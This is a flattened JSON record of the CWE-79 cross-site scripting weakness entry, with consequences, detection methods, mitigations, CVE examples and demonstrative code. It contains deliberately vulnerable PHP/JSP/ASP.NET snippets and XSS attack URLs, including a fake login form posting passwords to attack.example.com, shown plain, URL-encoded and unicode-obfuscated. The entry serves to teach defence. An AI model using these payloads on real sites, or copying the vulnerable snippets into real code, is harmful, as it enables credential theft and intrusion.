{
  "ID": "79",
  "Name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
  "Abstraction": "Base",
  "Structure": "Simple",
  "Status": "Stable",
  "Diagram": "/data/images/CWE-79-Diagram.png",
  "Description": "The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.",
  "ExtendedDescription": "\n\nThere are many variants of cross-site scripting, characterized by a variety of terms or involving different attack topologies. However, they all indicate the same fundamental weakness: improper neutralization of dangerous input between the adversary and a victim.\n",
  "LikelihoodOfExploit": "High",
  "RelatedWeaknesses.0.Nature": "ChildOf",
  "RelatedWeaknesses.0.CweID": "74",
  "RelatedWeaknesses.0.ViewID": "1000",
  "RelatedWeaknesses.0.Ordinal": "Primary",
  "RelatedWeaknesses.1.Nature": "ChildOf",
  "RelatedWeaknesses.1.CweID": "74",
  "RelatedWeaknesses.1.ViewID": "1003",
  "RelatedWeaknesses.1.Ordinal": "Primary",
  "RelatedWeaknesses.2.Nature": "CanPrecede",
  "RelatedWeaknesses.2.CweID": "494",
  "RelatedWeaknesses.2.ViewID": "1000",
  "RelatedWeaknesses.3.Nature": "PeerOf",
  "RelatedWeaknesses.3.CweID": "352",
  "RelatedWeaknesses.3.ViewID": "1000",
  "WeaknessOrdinalities.0.Ordinality": "Resultant",
  "ApplicablePlatforms.0.Type": "Language",
  "ApplicablePlatforms.0.Class": "Not Language-Specific",
  "ApplicablePlatforms.0.Prevalence": "Undetermined",
  "ApplicablePlatforms.1.Type": "Technology",
  "ApplicablePlatforms.1.Class": "Web Based",
  "ApplicablePlatforms.1.Prevalence": "Often",
  "BackgroundDetails.0": "\n\nThe Same Origin Policy states that browsers should limit the resources accessible to scripts running on a given web site, or \"origin\", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or \"origins\". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.\n\n\nWhen referring to XSS, the Domain of a website is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.\n",
  "AlternateTerms.0.Term": "XSS",
  "AlternateTerms.0.Description": "A common abbreviation for Cross-Site Scripting.",
  "AlternateTerms.1.Term": "HTML Injection",
  "AlternateTerms.1.Description": "Used as a synonym of stored (Type 2) XSS.",
  "AlternateTerms.2.Term": "Reflected XSS / Non-Persistent XSS / Type 1 XSS",
  "AlternateTerms.2.Description": "Used when a server application reads data directly from the HTTP request and reflects it back in the HTTP response.",
  "AlternateTerms.3.Term": "Stored XSS / Persistent XSS / Type 2 XSS",
  "AlternateTerms.3.Description": "Used when a server-side application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content.",
  "AlternateTerms.4.Term": "DOM-Based XSS / Type 0 XSS",
  "AlternateTerms.4.Description": "Used when a client-side application performs the injection of XSS into the page by manipulating the Domain Object Model (DOM).",
  "AlternateTerms.5.Term": "CSS",
  "AlternateTerms.5.Description": "In the early years after initial discovery of XSS, \"CSS\" was a commonly-used acronym. However, this would cause confusion with \"Cascading Style Sheets,\" so usage of this acronym has declined significantly.",
  "ModesOfIntroduction.0.Phase": "Implementation",
  "ModesOfIntroduction.0.Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic.",
  "CommonConsequences.0.Scope.0": "Access Control",
  "CommonConsequences.0.Scope.1": "Confidentiality",
  "CommonConsequences.0.Impact.0": "Bypass Protection Mechanism",
  "CommonConsequences.0.Impact.1": "Read Application Data",
  "CommonConsequences.0.Note": "The most common attack performed with cross-site scripting involves the disclosure of private information stored in user cookies, such as session information. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity on behalf of the victim to an attacker-controlled system (such as sending all site cookies to a given E-mail address). This could be especially dangerous to the site if the victim has administrator privileges to manage that site. This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.",
  "CommonConsequences.1.Scope.0": "Integrity",
  "CommonConsequences.1.Scope.1": "Confidentiality",
  "CommonConsequences.1.Scope.2": "Availability",
  "CommonConsequences.1.Impact.0": "Execute Unauthorized Code or Commands",
  "CommonConsequences.1.Note": "In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws, for example, \"drive-by hacking.\"",
  "CommonConsequences.2.Scope.0": "Confidentiality",
  "CommonConsequences.2.Scope.1": "Integrity",
  "CommonConsequences.2.Scope.2": "Availability",
  "CommonConsequences.2.Scope.3": "Access Control",
  "CommonConsequences.2.Impact.0": "Execute Unauthorized Code or Commands",
  "CommonConsequences.2.Impact.1": "Bypass Protection Mechanism",
  "CommonConsequences.2.Impact.2": "Read Application Data",
  "CommonConsequences.2.Note": "The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running \"Active X\" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.",
  "DetectionMethods.0.Method": "Automated Static Analysis",
  "DetectionMethods.0.Description": "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.",
  "DetectionMethods.0.Effectiveness": "Moderate",
  "DetectionMethods.1.Method": "Black Box",
  "DetectionMethods.1.Description": "Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.",
  "DetectionMethods.1.Effectiveness": "Moderate",
  "DetectionMethods.1.EffectivenessNotes": "With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store.",
  "PotentialMitigations.0.MitigationID": "MIT-4",
  "PotentialMitigations.0.Phase.0": "Architecture and Design",
  "PotentialMitigations.0.Strategy": "Libraries or Frameworks",
  "PotentialMitigations.0.Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nExamples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.\n",
  "PotentialMitigations.1.Phase.0": "Implementation",
  "PotentialMitigations.1.Phase.1": "Architecture and Design",
  "PotentialMitigations.1.Description": "\n\nUnderstand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.\n\n\nFor any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.\n\n\nParts of the same output document may require different encodings, which will vary depending on whether the output is in the:\n\n\n  - HTML body\n\n  - Element attributes (such as src=\"XYZ\")\n\n  - URIs\n\n  - JavaScript sections\n\n  - Cascading Style Sheets and style property\n\netc. Note that HTML Entity Encoding is only appropriate for the HTML body.\n\nConsult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.\n",
  "PotentialMitigations.2.MitigationID": "MIT-6",
  "PotentialMitigations.2.Phase.0": "Architecture and Design",
  "PotentialMitigations.2.Phase.1": "Implementation",
  "PotentialMitigations.2.Strategy": "Attack Surface Reduction",
  "PotentialMitigations.2.Description": "Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.",
  "PotentialMitigations.2.Effectiveness": "Limited",
  "PotentialMitigations.2.EffectivenessNotes": "This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.",
  "PotentialMitigations.3.MitigationID": "MIT-15",
  "PotentialMitigations.3.Phase.0": "Architecture and Design",
  "PotentialMitigations.3.Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.",
  "PotentialMitigations.4.MitigationID": "MIT-27",
  "PotentialMitigations.4.Phase.0": "Architecture and Design",
  "PotentialMitigations.4.Strategy": "Parameterization",
  "PotentialMitigations.4.Description": "If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.",
  "PotentialMitigations.5.MitigationID": "MIT-30.1",
  "PotentialMitigations.5.Phase.0": "Implementation",
  "PotentialMitigations.5.Strategy": "Output Encoding",
  "PotentialMitigations.5.Description": "\n\nUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.\n\n\nThe problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.\n",
  "PotentialMitigations.6.MitigationID": "MIT-43",
  "PotentialMitigations.6.Phase.0": "Implementation",
  "PotentialMitigations.6.Description": "With Struts, write all data from form beans with the bean's filter attribute set to true.",
  "PotentialMitigations.7.MitigationID": "MIT-31",
  "PotentialMitigations.7.Phase.0": "Implementation",
  "PotentialMitigations.7.Strategy": "Attack Surface Reduction",
  "PotentialMitigations.7.Description": "To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.",
  "PotentialMitigations.7.Effectiveness": "Defense in Depth",
  "PotentialMitigations.8.MitigationID": "MIT-5",
  "PotentialMitigations.8.Phase.0": "Implementation",
  "PotentialMitigations.8.Strategy": "Input Validation",
  "PotentialMitigations.8.Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\n\nWhen dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.\n\n\nNote that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (\"<3\") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the \"<\" character, which would need to be escaped or otherwise handled. In this case, stripping the \"<\" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.\n\n\nEven if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.\n\n\nEnsure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.\n",
  "PotentialMitigations.9.MitigationID": "MIT-21",
  "PotentialMitigations.9.Phase.0": "Architecture and Design",
  "PotentialMitigations.9.Strategy": "Enforcement by Conversion",
  "PotentialMitigations.9.Description": "When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.",
  "PotentialMitigations.10.MitigationID": "MIT-29",
  "PotentialMitigations.10.Phase.0": "Operation",
  "PotentialMitigations.10.Strategy": "Firewall",
  "PotentialMitigations.10.Description": "Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.",
  "PotentialMitigations.10.Effectiveness": "Moderate",
  "PotentialMitigations.10.EffectivenessNotes": "An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.",
  "PotentialMitigations.11.MitigationID": "MIT-16",
  "PotentialMitigations.11.Phase.0": "Operation",
  "PotentialMitigations.11.Phase.1": "Implementation",
  "PotentialMitigations.11.Strategy": "Environment Hardening",
  "PotentialMitigations.11.Description": "When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.",
  "DemonstrativeExamples.0.Entries.0.IntroText": "The following code displays a welcome message on a web page based on the HTTP GET username parameter (covers a Reflected XSS (Type 1) scenario).",
  "DemonstrativeExamples.0.Entries.1.Nature": "Bad",
  "DemonstrativeExamples.0.Entries.1.Language": "PHP",
  "DemonstrativeExamples.0.Entries.1.ExampleCode": "```\n\t$username = $_GET['username'];\n\techo '<div class=\"header\"> Welcome, ' . $username . '</div>';\n```",
  "DemonstrativeExamples.0.Entries.2.BodyText": "Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as",
  "DemonstrativeExamples.0.Entries.3.Nature": "Attack",
  "DemonstrativeExamples.0.Entries.3.ExampleCode": "```\n\thttp://trustedSite.example.com/welcome.php?username=<Script Language=\"Javascript\">alert(\"You've been attacked!\");</Script>\n```",
  "DemonstrativeExamples.0.Entries.4.BodyText": "This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.",
  "DemonstrativeExamples.0.Entries.5.BodyText": "More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:",
  "DemonstrativeExamples.0.Entries.6.Nature": "Attack",
  "DemonstrativeExamples.0.Entries.6.ExampleCode": "```\n\thttp://trustedSite.example.com/welcome.php?username=<div id=\"stealPassword\">Please Login:<form name=\"input\" action=\"http://attack.example.com/stealPassword.php\" method=\"post\">Username: <input type=\"text\" name=\"username\" /><br/>Password: <input type=\"password\" name=\"password\" /><br/><input type=\"submit\" value=\"Login\" /></form></div>\n```",
  "DemonstrativeExamples.0.Entries.7.BodyText": "If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:",
  "DemonstrativeExamples.0.Entries.8.Nature": "Result",
  "DemonstrativeExamples.0.Entries.8.ExampleCode": "```\n\t<div class=\"header\"> Welcome, <div id=\"stealPassword\"> Please Login:\n\t\t<form name=\"input\" action=\"attack.example.com/stealPassword.php\" method=\"post\">\n\t\t\tUsername: <input type=\"text\" name=\"username\" /><br/>\n\t\t\tPassword: <input type=\"password\" name=\"password\" /><br/>\n\t\t\t<input type=\"submit\" value=\"Login\" />\n\t\t</form>\n\t</div></div>\n```",
  "DemonstrativeExamples.0.Entries.9.BodyText": "The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):",
  "DemonstrativeExamples.0.Entries.10.Nature": "Attack",
  "DemonstrativeExamples.0.Entries.10.ExampleCode": "```\n\ttrustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22\n\tstealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input\n\t%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php\n\t%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text\n\t%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A\n\t+%3Cinput+type%3D%22password%22+name%3D%22password%22\n\t+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22\n\t+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A\n```",
  "DemonstrativeExamples.0.Entries.11.BodyText": "The same attack string could also be obfuscated as:",
  "DemonstrativeExamples.0.Entries.12.Nature": "Attack",
  "DemonstrativeExamples.0.Entries.12.ExampleCode": "```\n\ttrustedSite.example.com/welcome.php?username=<script+type=\"text/javascript\">\n\tdocument.write('\\u003C\\u0064\\u0069\\u0076\\u0020\\u0069\\u0064\\u003D\\u0022\\u0073\n\t\\u0074\\u0065\\u0061\\u006C\\u0050\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\n\t\\u0022\\u003E\\u0050\\u006C\\u0065\\u0061\\u0073\\u0065\\u0020\\u004C\\u006F\\u0067\n\t\\u0069\\u006E\\u003A\\u003C\\u0066\\u006F\\u0072\\u006D\\u0020\\u006E\\u0061\\u006D\n\t\\u0065\\u003D\\u0022\\u0069\\u006E\\u0070\\u0075\\u0074\\u0022\\u0020\\u0061\\u0063\n\t\\u0074\\u0069\\u006F\\u006E\\u003D\\u0022\\u0068\\u0074\\u0074\\u0070\\u003A\\u002F\n\t\\u002F\\u0061\\u0074\\u0074\\u0061\\u0063\\u006B\\u002E\\u0065\\u0078\\u0061\\u006D\n\t\\u0070\\u006C\\u0065\\u002E\\u0063\\u006F\\u006D\\u002F\\u0073\\u0074\\u0065\\u0061\n\t\\u006C\\u0050\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\\u002E\\u0070\\u0068\n\t\\u0070\\u0022\\u0020\\u006D\\u0065\\u0074\\u0068\\u006F\\u0064\\u003D\\u0022\\u0070\n\t\\u006F\\u0073\\u0074\\u0022\\u003E\\u0055\\u0073\\u0065\\u0072\\u006E\\u0061\\u006D\n\t\\u0065\\u003A\\u0020\\u003C\\u0069\\u006E\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\n\t\\u0070\\u0065\\u003D\\u0022\\u0074\\u0065\\u0078\\u0074\\u0022\\u0020\\u006E\\u0061\n\t\\u006D\\u0065\\u003D\\u0022\\u0075\\u0073\\u0065\\u0072\\u006E\\u0061\\u006D\\u0065\n\t\\u0022\\u0020\\u002F\\u003E\\u003C\\u0062\\u0072\\u002F\\u003E\\u0050\\u0061\\u0073\n\t\\u0073\\u0077\\u006F\\u0072\\u0064\\u003A\\u0020\\u003C\\u0069\\u006E\\u0070\\u0075\n\t\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003D\\u0022\\u0070\\u0061\\u0073\\u0073\n\t\\u0077\\u006F\\u0072\\u0064\\u0022\\u0020\\u006E\\u0061\\u006D\\u0065\\u003D\\u0022\n\t\\u0070\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\\u0022\\u0020\\u002F\\u003E\n\t\\u003C\\u0069\\u006E\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003D\n\t\\u0022\\u0073\\u0075\\u0062\\u006D\\u0069\\u0074\\u0022\\u0020\\u0076\\u0061\\u006C\n\t\\u0075\\u0065\\u003D\\u0022\\u004C\\u006F\\u0067\\u0069\\u006E\\u0022\\u0020\\u002F\n\t\\u003E\\u003C\\u002F\\u0066\\u006F\\u0072\\u006D\\u003E\\u003C\\u002F\\u0064\\u0069\\u0076\\u003E\\u000D');</script>\n```",
  "DemonstrativeExamples.0.Entries.13.BodyText": "Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.",
  "DemonstrativeExamples.1.Entries.0.IntroText": "The following code displays a Reflected XSS (Type 1) scenario.",
  "DemonstrativeExamples.1.Entries.1.BodyText": "The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.",
  "DemonstrativeExamples.1.Entries.2.Nature": "Bad",
  "DemonstrativeExamples.1.Entries.2.Language": "JSP",
  "DemonstrativeExamples.1.Entries.2.ExampleCode": "```\n\t<% String eid = request.getParameter(\"eid\"); %>\n\t...\n\tEmployee ID: <%= eid %>\n```",
  "DemonstrativeExamples.1.Entries.3.BodyText": "The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.",
  "DemonstrativeExamples.1.Entries.4.Nature": "Bad",
  "DemonstrativeExamples.1.Entries.4.Language": "ASP.NET",
  "DemonstrativeExamples.1.Entries.4.ExampleCode": "```\n\t<%\n\tprotected System.Web.UI.WebControls.TextBox Login;\n\tprotected System.Web.UI.WebControls.Label EmployeeID;\n\t...\n\tEmployeeID.Text = Login.Text;\n\t%>\n\t<p><asp:label id=\"EmployeeID\" runat=\"server\" /></p>\n```",
  "DemonstrativeExamples.1.Entries.5.BodyText": "The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.",
  "DemonstrativeExamples.2.Entries.0.IntroText": "The following code displays a Stored XSS (Type 2) scenario.",
  "DemonstrativeExamples.2.Entries.1.BodyText": "The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.",
  "DemonstrativeExamples.2.Entries.2.Nature": "Bad",
  "DemonstrativeExamples.2.Entries.2.Language": "JSP",
  "DemonstrativeExamples.2.Entries.2.ExampleCode": "```\n\t<%Statement stmt = conn.createStatement();\n\tResultSet rs = stmt.executeQuery(\"select * from emp where id=\"+eid);\n\tif (rs != null) {\n\t\trs.next();\n\t\tString name = rs.getString(\"name\");\n\t}%>\n\tEmployee Name: <%= name %>\n```",
  "DemonstrativeExamples.2.Entries.3.BodyText": "The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.",
  "DemonstrativeExamples.2.Entries.4.Nature": "Bad",
  "DemonstrativeExamples.2.Entries.4.Language": "ASP.NET",
  "DemonstrativeExamples.2.Entries.4.ExampleCode": "```\n\t<%\n\tprotected System.Web.UI.WebControls.Label EmployeeName;\n\t...\n\tstring query = \"select * from emp where id=\" + eid;\n\tsda = new SqlDataAdapter(query, conn);\n\tsda.Fill(dt);\n\tstring name = dt.Rows[0][\"Name\"];\n\t...\n\tEmployeeName.Text = name;%>\n\t<p><asp:label id=\"EmployeeName\" runat=\"server\" /></p>\n```",
  "DemonstrativeExamples.2.Entries.5.BodyText": "This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.",
  "DemonstrativeExamples.3.Entries.0.IntroText": "The following code consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.",
  "DemonstrativeExamples.3.Entries.1.BodyText": "CreateUser.php",
  "DemonstrativeExamples.3.Entries.2.Nature": "Bad",
  "DemonstrativeExamples.3.Entries.2.Language": "PHP",
  "DemonstrativeExamples.3.Entries.2.ExampleCode": "```\n\t$username = mysql_real_escape_string($username);\n\t$fullName = mysql_real_escape_string($fullName);\n\t$query = sprintf('Insert Into users (username,password) Values (\"%s\",\"%s\",\"%s\")', $username, crypt($password),$fullName) ;\n\tmysql_query($query);\n\t/.../\n```",
  "DemonstrativeExamples.3.Entries.3.BodyText": "The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:",
  "DemonstrativeExamples.3.Entries.4.BodyText": "ListUsers.php",
  "DemonstrativeExamples.3.Entries.5.Nature": "Bad",
  "DemonstrativeExamples.3.Entries.5.Language": "PHP",
  "DemonstrativeExamples.3.Entries.5.ExampleCode": "```\n\t$query = 'Select * From users Where loggedIn=true';\n\t$results = mysql_query($query);\n\tif (!$results) {\n\t\texit;\n\t}\n```\n//Print list of users to page* \n\techo '<div id=\"userlist\">Currently Active Users:';\n\twhile ($row = mysql_fetch_assoc($results)) {\n\t```\n\t\techo '<div class=\"userNames\">'.$row['fullname'].'</div>';\n\t}\n\techo '</div>';\n```",
  "DemonstrativeExamples.3.Entries.6.BodyText": "The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.",
  "DemonstrativeExamples.4.Entries.0.IntroText": "The following code is a simplistic message board that saves messages in HTML format and appends them to a file. When a new user arrives in the room, it makes an announcement:",
  "DemonstrativeExamples.4.Entries.1.Nature": "Bad",
  "DemonstrativeExamples.4.Entries.1.Language": "PHP",
  "DemonstrativeExamples.4.Entries.1.ExampleCode": "```\n\t$name = $_COOKIE[\"myname\"];\n\t$announceStr = \"$name just logged in.\";\n```\n//save HTML-formatted message to file; implementation details are irrelevant for this example.* \n\t saveMessage($announceStr);",
  "DemonstrativeExamples.4.Entries.2.BodyText": "An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:",
  "DemonstrativeExamples.4.Entries.3.Nature": "Attack",
  "DemonstrativeExamples.4.Entries.3.ExampleCode": "```\n\t<script>document.alert('Hacked');</script>\n```",
  "DemonstrativeExamples.4.Entries.4.BodyText": "The raw contents of the message file would look like:",
  "DemonstrativeExamples.4.Entries.5.Nature": "Result",
  "DemonstrativeExamples.4.Entries.5.ExampleCode": "```\n\t<script>document.alert('Hacked');</script> has logged in.\n```",
  "DemonstrativeExamples.4.Entries.6.BodyText": "For each person who visits the message page, their browser would execute the script, generating a pop-up window that says \"Hacked\". More malicious attacks are possible; see the rest of this entry.",
  "ObservedExamples.0.Reference": "CVE-2021-25926",
  "ObservedExamples.0.Description": "Python Library Manager did not sufficiently neutralize a user-supplied search term, allowing reflected XSS.",
  "ObservedExamples.0.Link": "https://www.cve.org/CVERecord?id=CVE-2021-25926",
  "ObservedExamples.1.Reference": "CVE-2021-25963",
  "ObservedExamples.1.Description": "Python-based e-commerce platform did not escape returned content on error pages, allowing for reflected Cross-Site Scripting attacks.",
  "ObservedExamples.1.Link": "https://www.cve.org/CVERecord?id=CVE-2021-25963",
  "ObservedExamples.2.Reference": "CVE-2021-1879",
  "ObservedExamples.2.Description": "Universal XSS in mobile operating system, as exploited in the wild per CISA KEV.",
  "ObservedExamples.2.Link": "https://www.cve.org/CVERecord?id=CVE-2021-1879",
  "ObservedExamples.3.Reference": "CVE-2020-3580",
  "ObservedExamples.3.Description": "Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.",
  "ObservedExamples.3.Link": "https://www.cve.org/CVERecord?id=CVE-2020-3580",
  "ObservedExamples.4.Reference": "CVE-2014-8958",
  "ObservedExamples.4.Description": "Admin GUI allows XSS through cookie.",
  "ObservedExamples.4.Link": "https://www.cve.org/CVERecord?id=CVE-2014-8958",
  "ObservedExamples.5.Reference": "CVE-2017-9764",
  "ObservedExamples.5.Description": "Web stats program allows XSS through crafted HTTP header.",
  "ObservedExamples.5.Link": "https://www.cve.org/CVERecord?id=CVE-2017-9764",
  "ObservedExamples.6.Reference": "CVE-2014-5198",
  "ObservedExamples.6.Description": "Web log analysis product allows XSS through crafted HTTP Referer header.",
  "ObservedExamples.6.Link": "https://www.cve.org/CVERecord?id=CVE-2014-5198",
  "ObservedExamples.7.Reference": "CVE-2008-5080",
  "ObservedExamples.7.Description": "Chain: protection mechanism failure allows XSS",
  "ObservedExamples.7.Link": "https://www.cve.org/CVERecord?id=CVE-2008-5080",
  "ObservedExamples.8.Reference": "CVE-2006-4308",
  "ObservedExamples.8.Description": "Chain: incomplete denylist (CWE-184) only checks \"javascript:\" tag, allowing XSS (CWE-79) using other tags",
  "ObservedExamples.8.Link": "https://www.cve.org/CVERecord?id=CVE-2006-4308",
  "ObservedExamples.9.Reference": "CVE-2007-5727",
  "ObservedExamples.9.Description": "Chain: incomplete denylist (CWE-184) only removes SCRIPT tags, enabling XSS (CWE-79)",
  "ObservedExamples.9.Link": "https://www.cve.org/CVERecord?id=CVE-2007-5727",
  "ObservedExamples.10.Reference": "CVE-2008-5770",
  "ObservedExamples.10.Description": "Reflected XSS using the PATH_INFO in a URL",
  "ObservedExamples.10.Link": "https://www.cve.org/CVERecord?id=CVE-2008-5770",
  "ObservedExamples.11.Reference": "CVE-2008-4730",
  "ObservedExamples.11.Description": "Reflected XSS not properly handled when generating an error message",
  "ObservedExamples.11.Link": "https://www.cve.org/CVERecord?id=CVE-2008-4730",
